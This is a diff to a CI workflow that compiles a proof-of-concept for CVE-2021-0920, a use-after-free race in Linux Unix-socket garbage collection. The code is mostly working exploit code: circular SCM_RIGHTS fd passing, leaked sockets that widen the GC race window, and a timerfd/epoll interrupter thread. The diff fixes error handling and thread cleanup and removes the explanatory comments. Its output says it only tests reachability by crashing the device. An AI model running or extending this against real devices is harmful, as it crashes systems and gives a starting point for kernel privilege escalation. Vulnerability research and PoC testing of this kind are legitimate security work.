@@ -1,4 +1,4 @@
-name: build_cve_2021_0920_poc_v4
+name: build_cve_2021_0920_poc_v4_fixed
 on: [push, workflow_dispatch]
 
 jobs:
@@ -39,7 +39,6 @@ jobs:
           static int g_success = 0;
           static int g_crashed = 0;
 
-          // Send fd via SCM_RIGHTS
           static int send_fd(int sock, int fd) {
               struct msghdr msg = {0};
               char ctrl[CMSG_SPACE(sizeof(int))];
@@ -57,46 +56,40 @@ jobs:
               return sendmsg(sock, &msg, 0);
           }
 
-          // Create lots of sockets to extend GC window
           static void create_garbage(int count) {
               for (int i = 0; i < count; i++) {
                   int s = socket(AF_UNIX, SOCK_STREAM, 0);
                   if (s >= 0) {
-                      // Just create and leak - they become garbage
-                      // Don't close, so they stay in memory longer
+                      // Don't close - keep as garbage
                   }
               }
           }
 
-          // Worker thread: setup socket pairs with SCM_RIGHTS
           static void *worker(void *arg) {
               (void)arg;
               int sv[2];
               int pairs[64][2];
               
-              // Create garbage sockets to slow down GC
               create_garbage(200);
               
               for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
                   if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;
                   
-                  // Create many socketpairs with fd passing
                   for (int i = 0; i < 64; i++) {
-                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) break;
+                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
+                          pairs[i][0] = -1; pairs[i][1] = -1;
+                          continue;
+                      }
                       send_fd(sv[0], pairs[i][0]);
                       send_fd(pairs[i][0], pairs[i][1]);
-                      // Circular reference - this is what triggers the GC bug
                       send_fd(pairs[i][1], pairs[i][0]);
                   }
                   
-                  // Trigger GC by closing main socket
                   close(sv[0]);
                   close(sv[1]);
                   
-                  // sched_yield instead of setpriority (no CAP_SYS_NICE needed)
                   sched_yield();
                   
-                  // Try to hit the race
                   for (int i = 0; i < 64; i++) {
                       if (pairs[i][0] >= 0) close(pairs[i][0]);
                       if (pairs[i][1] >= 0) close(pairs[i][1]);
@@ -112,7 +105,6 @@ jobs:
               return NULL;
           }
 
-          // Thread that uses timerfd + epoll to interrupt the main thread
           static void *interrupter(void *arg) {
               int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
               if (tfd < 0) return NULL;
@@ -143,22 +135,19 @@ jobs:
               printf("[*] Note: this only tests if the UAF is reachable.\n");
               printf("[*] If the device crashes, the bug is confirmed.\n\n");
               
-              // Start interrupter thread
               pthread_t interrupt_thread;
               pthread_create(&interrupt_thread, NULL, interrupter, NULL);
               
-              // Start worker threads
               pthread_t workers[NUM_PARALLEL];
               for (int i = 0; i < NUM_PARALLEL; i++) {
                   pthread_create(&workers[i], NULL, worker, NULL);
               }
               
-              // Wait for workers
               for (int i = 0; i < NUM_PARALLEL; i++) {
                   pthread_join(workers[i], NULL);
               }
               
-              pthread_cancel(interrupt_thread);
+              pthread_join(interrupt_thread, NULL);
               
               printf("\n[*] PoC finished without crash.\n");
               printf("[*] The race did not trigger on this run.\n");
